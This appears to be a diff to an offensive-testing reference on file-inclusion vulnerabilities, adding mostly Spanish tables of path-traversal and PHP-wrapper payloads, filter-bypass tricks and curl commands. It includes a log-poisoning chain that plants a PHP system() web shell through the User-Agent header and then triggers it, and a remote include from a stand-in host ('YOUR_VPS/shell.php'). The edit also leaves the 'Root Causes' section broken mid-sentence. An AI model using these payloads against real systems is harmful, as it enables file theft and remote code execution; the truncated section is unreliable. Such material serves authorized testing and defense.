@@ -133,9 +133,62 @@ chains_with: [rce, info-disclosure, ssrf]
   sensitive-file targets.
 - Burp Suite Intruder — same sweep, with response-size/status clustering to spot anomalies.
 
-## Root Causes
+## Payloads & Detection Patterns
 
-- User input concatenated directly into a filesystem path or `include()`/`require()` call
+Guía de caza: una familia por primitiva (traversal puro, bypass de extensión, wrapper read,
+wrapper exec, RFI). El oráculo es contenido real del archivo objetivo, nunca la fallback page.
+
+| Categoría | Shape | Propósito |
+|---|---|---|
+| Basic traversal | `../../../../etc/passwd`, `/etc/passwd` absoluto | Leer archivo local fuera del root |
+| Windows traversal | `..\..\..\windows\win.ini`, `C:\windows\win.ini` | Target Windows |
+| Filter doubling | `....//....//etc/passwd` | Evadir `str_replace("../","")` no recursivo |
+| Encoded traversal | `..%2f..%2f`, `%2e%2e%2f`, double `..%252f` | Mismatch decode-then-filter |
+| Extension bypass | `passwd%00`, `passwd/.`, `passwd%2500` | App fuerza `.php`/`.html` (null byte solo PHP viejo) |
+| php://filter read | `php://filter/convert.base64-encode/resource=config` | Leer fuente `.php` sin ejecutar |
+| data:// / php://input | `data://text/plain;base64,<payload>`, `php://input` | LFI→RCE sin remote file |
+| Log poisoning | UA `<?php system($_GET[c]);?>` + include `access.log` | LFI→RCE vía log includable |
+| zip:// / phar:// | `zip://./up/x.jpg%23shell.php`, `phar://` | RCE vía archivo subido/deserialización |
+| RFI | `http://YOUR_VPS/shell.php` | Include remoto (requiere `allow_url_include`) |
+
+Surface signals que delatan la clase antes de inyectar:
+- Params `page`, `template`, `file`, `lang`, `view`, `doc`, `module`, `include` que cargan recurso.
+- Stack PHP (`X-Powered-By: PHP`, `.php`, cookie `PHPSESSID`) → wrappers aplicables.
+- Download/export que streamea contenido de archivo por nombre/path.
+- La respuesta cambia (aun un error distinto) al añadir secuencias `../`.
+
+```bash
+# traversal + confirmación de CONTENIDO real (no una fallback page con 200)
+curl -s "https://target/view?page=../../../../etc/passwd"       | grep -E "^root:.*:0:0:"
+curl -s "https://target/view?page=..%252f..%252fetc%252fpasswd" | grep -E "^root:.*:0:0:"
+# lectura de fuente .php vía wrapper (decodificar el base64)
+curl -s "https://target/view?page=php://filter/convert.base64-encode/resource=config" | base64 -d
+```
+
+```bash
+# oráculo ciego: log/wrapper que gatilla exec o fetch server-side → gate OOB con token
+curl -s -A '<?php system($_GET["cmd"]);?>' "https://target/"                      # poison
+curl -s "https://target/view?page=../../../../var/log/apache2/access.log&cmd=id"  # trigger
+```
+
+Si el wrapper o la poison-chain dispara un fetch server-side sin reflejar salida, correlaciona el
+callback por token en el gate OOB (`engine.oast`) antes de llamar al RCE `Demonstrated`.
+
+## Bypass Techniques
+
+Agrupadas por el filtro que evaden; ciclar la familia completa del backend confirmado antes de N/A.
+
+| Filtro evadido | Técnica | Notas |
+|---|---|---|
+| `str_replace("../","")` | Doubling `....//`, `..../\/` | El reemplazo no recursivo reconstruye `../` |
+| Decodifica una vez | Double-encode `%252e%252e%252f`, overlong UTF-8 | App decodifica dos veces antes del `fopen` |
+| Fuerza extensión `.php` | Null byte `%00`/`%2500`, path trunc `/.`, `php://filter` | Null byte muerto en PHP soportado |
+| Blocklist de `/etc/passwd` | Target alterno `/proc/self/environ`, `/proc/self/cmdline` | Otros archivos legibles por el user |
+| `realpath()`/`basename()` | Buscar otro param sin canonicalización | Si todas las variantes fallan → N/A sólido |
+| `allow_url_include` off (RFI) | Pivotar a `data://`/`php://input`/`zip://` | RCE sin remote fetch |
+| Upload filter por extensión | Zip disfrazado `.jpg` + `zip://...%23shell.php` | El content-type no valida el wrapper |
+
+ or `include()`/`require()` call
   without canonicalization and allowlist checking.
 - Relying on blocklist filtering (`str_replace("../", "", $input)`) which is defeated by
   doubling (`....//`), encoding, or non-dot-dot absolute paths.
